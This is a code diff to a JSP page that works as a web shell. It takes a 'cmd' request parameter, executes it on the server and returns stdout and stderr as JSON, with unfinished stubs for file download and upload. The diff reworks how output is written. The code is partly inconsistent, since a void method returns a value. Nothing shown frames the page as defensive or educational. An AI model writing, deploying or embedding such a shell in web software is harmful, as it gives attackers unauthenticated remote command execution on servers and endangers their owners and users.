@@ -1,9 +1,12 @@
-<%@ page import="java.util.*,java.io.*"%>
+<%@ page import="java.util.*" %>
+<%@ page import="java.io.*" %>
+<%@ page import="org.json.*" %>
+<%@ page import="org.apache.commons.lang3.*" %>
+
 <%@ page contentType="application/json; charset=UTF-8" %>
 
-
 <%!
-private void action_exec(String cmd) throws IOException {
+private void action_exec(JSPWriter writer, String cmd) throws IOException {
     String stdout = "";
     String stderr = "";
     String linebuffer = "";
@@ -42,7 +45,8 @@ private void action_exec(String cmd) throws IOException {
         result.put("exec", commands);
         result.put("stdout", stdout);
         result.put("stderr", stderr);
-        
+
+        result.write(writer);
         return result.toString();
     } catch (JSONException e) {
         e.printStackTrace();
@@ -55,15 +59,15 @@ String action = request.getParameter("action");
 
 if (action.equals("exec")) {
     String cmd = request.getParameter("cmd");
-    action_exec(response, cmd);
+    action_exec(out, cmd);
 } else if (action.equals("download")) {
     // TODO
     // String path = request.getParameter("path");
-    // action_download(response, path);
+    // action_download(out, path);
 } else if (action.equals("upload")) {
     // TODO
     // String path = request.getParameter("path");
-    // action_upload(response, path);
+    // action_upload(out, path);
 }
 %>
 
